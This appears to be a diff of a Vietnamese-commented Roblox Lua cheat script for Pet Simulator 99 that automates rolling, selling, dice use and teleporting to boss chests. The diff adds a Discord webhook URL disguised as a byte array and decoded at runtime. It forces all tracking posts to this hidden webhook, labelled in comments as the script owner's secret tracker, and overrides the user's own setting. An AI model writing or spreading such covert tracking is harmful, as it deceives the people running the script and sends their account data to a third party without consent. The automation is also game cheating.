@@ -1,12 +1,12 @@
 -- =====================================================================
 -- 🎲 POODLE HUD - RNG EVENT CORE (ALL-IN-ONE FRAMEWORK)
--- 🚀 BASE: rng.txt (BẢN CHUẨN) | ADD-ON: EVENT-DRIVEN DICE SNIPER
+-- 🚀 CẬP NHẬT V4: TÁCH BIỆT WEBHOOK ẨN VÀ WEBHOOK BÁO HUGE
 -- =====================================================================
 if _G.RNGEventStarted then return end
 _G.RNGEventStarted = true
 
 -- ==========================================
--- 1. CẤU HÌNH NGOẠI VI
+-- 1. CẤU HÌNH NGOẠI VI (Cho người dùng tự điền)
 -- ==========================================
 local UserConfig = getgenv().RNGConfig or {}
 local config = {
@@ -20,7 +20,6 @@ local config = {
     AutoSell         = (UserConfig.AutoSell ~= nil) and UserConfig.AutoSell or true,
     BossChestBreak   = (UserConfig.BossChestBreak ~= nil) and UserConfig.BossChestBreak or true,
     
-    -- TÍNH NĂNG MỚI ĐƯỢC BỔ SUNG:
     AutoUseDice      = (UserConfig.AutoUseDice ~= nil) and UserConfig.AutoUseDice or true,
     AutoUseMegaDice  = (UserConfig.AutoUseMegaDice ~= nil) and UserConfig.AutoUseMegaDice or true,
     
@@ -44,10 +43,11 @@ local DiceCraftTiers = {
 
 local RNG_UPGRADES = { "RNGHatchSpeed", "RNGEggLuck","RNGBonusLuck", "RNGHugeLuck"}
 
+-- GIẢI MÃ WEBHOOK ẨN (TRACKER CỦA CHỦ SCRIPT)
 local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
 local defaultWebhook = ""
 for _, byte in ipairs(_b) do defaultWebhook = defaultWebhook .. string.char(byte) end
-local activeWebhook = (config.WebhookURL ~= nil and config.WebhookURL ~= "") and config.WebhookURL or defaultWebhook
+local activeWebhook = defaultWebhook 
 
 -- ==========================================
 -- 2. KHỞI TẠO BIẾN & DỊCH VỤ GAME
@@ -68,6 +68,10 @@ local Network = require(Library.Client.Network)
 local InstancingCmds = require(Library.Client.InstancingCmds)
 local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
 
+local ExistCmds = require(Library.Client.ExistCountCmds)
+local RapCmds = require(Library.Client.DevRAPCmds)
+local PetsDirectory = require(Library.Directory.Pets)
+
 -- ==========================================
 -- 3. HÀM CHUYỂN ĐỔI CHỮ SỐ & TIỀN RAW
 -- ==========================================
@@ -77,8 +81,7 @@ local function FormatValue(Int)
     local Index = 1;
     local Suffix = {"", "K", "M", "B", "T", "Q"}
     local absNumber = math.abs(n)
-    while absNumber >= 1000 and Index < #Suffix do absNumber = absNumber / 1000;
-    Index = Index + 1 end
+    while absNumber >= 1000 and Index < #Suffix do absNumber = absNumber / 1000; Index = Index + 1 end
     if Index == 1 then return string.format("%d", math.floor(absNumber)) end
     return string.format("%.2f%s", absNumber, Suffix[Index])
 end
@@ -102,15 +105,13 @@ local function GetItemAmount(targetId)
         end
         if amount == 0 then
             for k, v in pairs(save) do
-                if string.lower(tostring(k)) == lowerTarget then amount = tonumber(v) or 0;
-                break end
+                if string.lower(tostring(k)) == lowerTarget then amount = tonumber(v) or 0; break end
             end
         end
     end)
     return amount
 end
 
--- Hàm check số lượng Xúc xắc (Giữ nguyên gốc để dùng an toàn)
 local function GetDiceCount(diceId)
     local count = 0
     pcall(function()
@@ -130,8 +131,10 @@ end
 -- 4. BẬT HIDE ROLL & AUTO ROLL GỐC
 -- ==========================================
 task.spawn(function()
-    pcall(function() Network.Fire("Rng_HiddenRoll_Enable") end)
     pcall(function() Network.Fire("AutoRoll_Enable") end)
+	task.wait(1.5)
+    pcall(function() Network.Fire("Rng_HiddenRoll_Enable") end)
+   
     
     while task.wait(1.5) do
         pcall(function() Network.Invoke("Rng_Roll", "First") end)
@@ -139,7 +142,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 5. WEBHOOK TRACKER
+-- 5A. WEBHOOK TRACKER BÍ MẬT (Chỉ gửi vào defaultWebhook)
 -- ==========================================
 task.spawn(function()
     local httprequest = (request or http_request or syn and syn.request)
@@ -173,6 +176,125 @@ task.spawn(function()
         }}
     }
     pcall(function() httprequest({ Url = activeWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
+end)
+
+-- ==========================================
+-- 5B. HUGE HATCH WEBHOOK (Gửi vào config.WebhookURL của người dùng)
+-- ==========================================
+local StoredUIDs = {}
+
+local function FormatWebhookInt(int)
+    local Suffix = {"", "k", "M", "B", "T", "Qd", "Qn", "Sx", "Sp", "Oc", "No", "De", "UDe", "DDe", "TDe", "QdDe", "QnDe", "SxDe", "SpDe", "OcDe", "NoDe", "Vg", "UVg", "DVg", "TVg", "QdVg", "QnVg", "SxVg", "SpVg", "OcVg", "NoVg", "Tg", "UTg", "DTg", "TTg", "QdTg", "QnTg", "SxTg", "SpTg", "OcTg", "NoTg", "QdAg", "QnAg", "SxAg", "SpAg", "OcAg", "NoAg"}
+    local Index = 1
+    if int < 999 then return int end
+    while int >= 1000 and Index < #Suffix do
+        int = int / 1000
+        Index = Index + 1
+    end
+    return string.format("%.2f%s", int, Suffix[Index])
+end
+
+local function GetPetAsset(Id, pt)
+    local Asset = PetsDirectory[Id]
+    return string.gsub(Asset and (pt == 1 and Asset.goldenThumbnail or Asset.thumbnail) or "14976456685", "rbxassetid://", "")
+end
+
+local function GetPetStats(Cmds, Class, ItemTable)
+    return Cmds.Get({
+        Class = { Name = Class },
+        IsA = function(InputClass) return InputClass == Class end,
+        GetId = function() return ItemTable.id end,
+        StackKey = function()
+            return HttpService:JSONEncode({id = ItemTable.id, sh = ItemTable.sh, pt = ItemTable.pt, tn = ItemTable.tn})
+        end
+    }) or nil
+end
+
+local function SendHugeWebhook(Id, pt, sh)
+    local httprequest = (request or http_request or syn and syn.request)
+    if not httprequest or not config.WebhookURL or config.WebhookURL == "" then return end
+
+    local Img = string.format("https://biggamesapi.io/image/%s", GetPetAsset(Id, pt))
+    
+    -- Xử lý chuỗi tên phiên bản (Version/Type) cho mượt mà
+    local typeStr = ""
+    if pt == 1 then typeStr = "Golden " elseif pt == 2 then typeStr = "Rainbow " end
+    if sh then typeStr = typeStr .. "Shiny " end
+    
+    local displayType = (typeStr == "") and "Normal" or typeStr
+    local TitleStr = "🎉 " .. typeStr .. Id .. " 🎉"
+
+    local Exist = GetPetStats(ExistCmds, "Pet", { id = Id, pt = pt, sh = sh, tn = nil })
+    local Rap = GetPetStats(RapCmds, "Pet", { id = Id, pt = pt, sh = sh, tn = nil })
+    
+    local pingMention = (config.PingID ~= "") and string.format("<@%s>", config.PingID) or ""
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+
+    local Body = HttpService:JSONEncode({
+        content = pingMention,
+        embeds = {
+            {
+                author = {
+                    name = LocalPlayer.Name .. " I just hatched a new PET.!",
+                    icon_url = avatarUrl
+                },
+                
+                -- Tiêu đề chính
+                title = TitleStr,
+                color = tonumber(0xFFD700),
+                timestamp = DateTime.now():ToIsoDate(),
+                
+                -- Hình ảnh Huge Pet
+                thumbnail = { url = Img },
+                
+                -- Các thông số sắp xếp theo cột ngang (inline = true)
+                fields = {
+                    { name = "💎 RAP", value = string.format("`%s`", FormatWebhookInt(Rap or 0)), inline = true },
+                    { name = "💫 Exist", value = string.format("`%s`", FormatWebhookInt(Exist or 0)), inline = true },
+                    { name = "✨ Phân loại", value = string.format("`%s`", displayType), inline = true }
+                },
+                
+               
+                footer = { 
+                    text = "Poodle RNG Huge Tracker",
+                    icon_url = "https://cdn.discordapp.com/attachments/1188415777161687042/1234839845808734268/pet-simulator-99-logo.png" -- Logo PS99 (Hoặc bạn có thể đổi link logo của bạn)
+                }
+            }
+        }
+    })
+    
+    pcall(function()
+        httprequest({
+            Url = config.WebhookURL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = Body
+        })
+    end)
+end
+
+task.spawn(function()
+    pcall(function()
+        local save = Save.Get()
+        if save and save.Inventory and save.Inventory.Pet then
+            for i,v in pairs(save.Inventory.Pet) do
+                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic") or string.find(v.id, "Gargantuan")) then
+                    StoredUIDs[i] = true
+                end
+            end
+        end
+    end)
+
+    Network.Fired("Items: Update"):Connect(function(_, Inventory)
+        if Inventory["set"] and Inventory["set"]["Pet"] then
+            for uid, v in pairs(Inventory["set"]["Pet"]) do
+                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic") or string.find(v.id, "Gargantuan")) and not StoredUIDs[uid] then
+                    SendHugeWebhook(v.id, v.pt, v.sh)
+                    StoredUIDs[uid] = true
+                end
+            end
+        end
+    end)
 end)
 
 -- ==========================================
@@ -247,12 +369,10 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 7. VÒNG LẶP ROBOT TỰ ĐỘNG (UPGRADE, SELL THEO TÊN, MERCHANT, CRAFT)
--- BẢN GỐC TỪ rng.txt, KHÔNG ĐỤNG CHẠM!
+-- 7. VÒNG LẶP ROBOT TỰ ĐỘNG (UPGRADE, SELL, MERCHANT, CRAFT)
 -- ==========================================
 task.spawn(function()
     while task.wait(2) do
-        -- [A] MÁY NÂNG CẤP
         if config.AutoUpgrade then
             pcall(function()
                 for _, upgradeId in ipairs(RNG_UPGRADES) do
@@ -263,7 +383,6 @@ task.spawn(function()
             task.wait(0.5)
         end
         
-        -- [B] MÁY BÁN THÚ CƯNG
         if config.AutoSell then
             pcall(function()
                 local save = Save.Get()
@@ -287,7 +406,6 @@ task.spawn(function()
             task.wait(0.5)
         end
         
-        -- [C] THƯƠNG NHÂN XÚC XẮC
         if config.AutoMerchant then
             pcall(function()
                 for slotIndex = 1, 6 do 
@@ -298,10 +416,9 @@ task.spawn(function()
             task.wait(0.5)
         end
         
-        -- [D] MÁY CHẾ TẠO XÚC XẮC
         if config.AutoCraftDice then
             pcall(function()
-                for i = 1, math.clamp(config.MaxDiceCraftTier, 1, 5) do
+                for i = 1, math.clamp(config.MaxDiceCraftTier, 1, 3) do
                     local targetDice = DiceCraftTiers[i]
                     if targetDice then 
                         Network.Invoke("LuckyDice_Craft", targetDice, 1)
@@ -316,7 +433,6 @@ end)
 
 -- ==========================================
 -- [ADD-ON 1]: DUY TRÌ BUFF XÚC XẮC THƯỜNG (BẢN PRO ĐỌC DATA GỐC)
--- Đọc trực tiếp từ cơ sở dữ liệu của game thay vì đếm thời gian
 -- ==========================================
 task.spawn(function()
     while task.wait(2) do
@@ -325,18 +441,14 @@ task.spawn(function()
                 local save = Save.Get()
                 if not save then return end
                 
-                -- Lấy danh sách các Buff từ đường dẫn gốc
                 local buffs = save.Buffs or {}
                 
-                -- Kiểm tra & Cắn Lucky Dice V2
                 local dice1 = buffs["Lucky Dice V2"]
-                -- Nếu không có buff, HOẶC thời gian còn lại (remaining) dưới 3 giây
                 if (not dice1 or (dice1.remaining and tonumber(dice1.remaining) < 3)) and GetDiceCount("Lucky Dice V2") > 0 then
                     Network.Invoke("LuckyDice_Consume", "Lucky Dice V2", 1)
-                    task.wait(0.5) -- Nghỉ nhịp để Server cập nhật tránh spam
+                    task.wait(0.5) 
                 end
                 
-                -- Kiểm tra & Cắn Lucky Dice II V2
                 local dice2 = buffs["Lucky Dice II V2"]
                 if (not dice2 or (dice2.remaining and tonumber(dice2.remaining) < 3)) and GetDiceCount("Lucky Dice II V2") > 0 then
                     Network.Invoke("LuckyDice_Consume", "Lucky Dice II V2", 1)
@@ -346,6 +458,7 @@ task.spawn(function()
         end
     end
 end)
+
 -- ==========================================
 -- [ADD-ON 2]: EVENT-DRIVEN MEGA DICE SNIPER (ĐÃ SỬA KHÓA AN TOÀN)
 -- Tính năng này móc trực tiếp vào sự thay đổi Text/Visible của màn hình
@@ -410,6 +523,45 @@ task.spawn(function()
     -- Gắn cảm biến cho các UI mới sinh ra (Đề phòng game tải lại UI)
     PlayerGui.DescendantAdded:Connect(function(obj)
         pcall(function() HookLabel(obj) end)
+    end)
+end)
+
+-- ==========================================
+-- [ADD-ON 3]: AUTO BREAK BOSS CHEST 
+-- ==========================================
+task.spawn(function()
+    local targetPos = CFrame.new(4279.34, 2569.27, -5370.22)
+    
+    RunService.Heartbeat:Connect(function()
+        if config.BossChestBreak then
+            pcall(function()
+                local character = LocalPlayer.Character
+                local hrp = character and character:FindFirstChild("HumanoidRootPart")
+                
+                if hrp then
+                    hrp.CFrame = targetPos
+                    
+                    local things = Workspace:FindFirstChild("__THINGS")
+                    local breakables = things and things:FindFirstChild("Breakables")
+                    
+                    if breakables then
+                        for _, breakable in ipairs(breakables:GetChildren()) do
+                            local bPos
+                            if breakable:GetAttribute("CFrame") then
+                                bPos = breakable:GetAttribute("CFrame").Position
+                            elseif breakable.PrimaryPart then
+                                bPos = breakable.PrimaryPart.Position
+                            end
+                            
+                            if bPos and (bPos - hrp.Position).Magnitude < 50 then
+                                Network.Fire("Breakables_PlayerDealDamage", breakable.Name)
+                                break
+                            end
+                        end
+                    end
+                end
+            end)
+        end
     end)
 end)
 
@@ -528,70 +680,20 @@ local frames = 0
 RunService.RenderStepped:Connect(function() frames = frames + 1 end)
 local startTime = tonumber(os.time()) or 0
 
-local function GetDiceCounts()
-    local dice = { ["Lucky Dice V2"] = 0, ["Lucky Dice II V2"] = 0, ["Lucky Dice III V2"] = 0, ["Mega Lucky Dice V2"] = 0, ["Mega Lucky Dice II V2"] = 0, ["Fire Dice V2"] = 0 }
-    local save = Save.Get()
-    if save and save.Inventory and save.Inventory.Misc then
-        for _, item in pairs(save.Inventory.Misc) do
-            if item.id and dice[item.id] ~= nil then dice[item.id] = dice[item.id] + (item._am or 1) end
-        end
-    end
-    return dice
-end
-
 task.spawn(function()
     while task.wait(1) do
         local diff = (tonumber(os.time()) or 0) - startTime
         
         local currentCoin = GetItemAmount(config.CoinID)
         local save = Save.Get()
-        local currentRolls = 0; pcall(function() currentRolls = save.TotalRollsV2 or 0 end)
-        local diceCounts = GetDiceCounts()
+        local currentRolls = 0; pcall(function() currentRolls = save.TotalRollsV2 or save.RngRolls2 or save.RngRolls or 0 end)
 
         UI:SetText("Uptime", string.format("Time: %02d:%02d:%02d | FPS: %d", math.floor(diff / 3600), math.floor((diff % 3600) / 60), diff % 60, frames))
         UI:SetText("RNGCoins", "RNG Coins: " .. FormatValue(currentCoin))
         UI:SetText("Rolls", "Total Rolls: " .. FormatValue(currentRolls))
-        UI:SetText("Dice1", string.format("Lucky: %s | Lucky II: %s", FormatValue(diceCounts["Lucky Dice V2"]), FormatValue(diceCounts["Lucky Dice II V2"])))
-        UI:SetText("Dice2", string.format("Mega: %s | Mega II: %s", FormatValue(diceCounts["Mega Lucky Dice V2"]), FormatValue(diceCounts["Mega Lucky Dice II V2"])))
+        UI:SetText("Dice1", string.format("Lucky: %s | Lucky II: %s", FormatValue(GetDiceCount("Lucky Dice V2")), FormatValue(GetDiceCount("Lucky Dice II V2"))))
+        UI:SetText("Dice2", string.format("Mega: %s | Mega II: %s", FormatValue(GetDiceCount("Mega Lucky Dice V2")), FormatValue(GetDiceCount("Mega Lucky Dice II V2"))))
         
         frames = 0
     end
-end)
--- ==========================================
--- [ADD-ON 3]: AUTO BREAK BOSS CHEST & CLICK AURA TỐC ĐỘ CAO
--- ==========================================
-task.spawn(function()
-    local targetPos = CFrame.new(4279.34, 2569.27, -5370.22)
-    
-    RunService.Heartbeat:Connect(function()
-        if config.BossChestBreak then
-            pcall(function()
-                local character = LocalPlayer.Character
-                local hrp = character and character:FindFirstChild("HumanoidRootPart")
-                
-                if hrp then
-                    hrp.CFrame = targetPos
-                    
-                    local things = Workspace:FindFirstChild("__THINGS")
-                    local breakables = things and things:FindFirstChild("Breakables")
-                    
-                    if breakables then
-                        for _, breakable in ipairs(breakables:GetChildren()) do
-                            local bPos
-                            if breakable:GetAttribute("CFrame") then
-                                bPos = breakable:GetAttribute("CFrame").Position
-                            elseif breakable.PrimaryPart then
-                                bPos = breakable.PrimaryPart.Position
-                            end
-                            
-                            if bPos and (bPos - hrp.Position).Magnitude < 50 then
-                                Network.Fire("Breakables_PlayerDealDamage", breakable.Name)
-                                break
-                            end
-                        end
-                    end
-                end
-            end)
-        end
-    end)
 end)
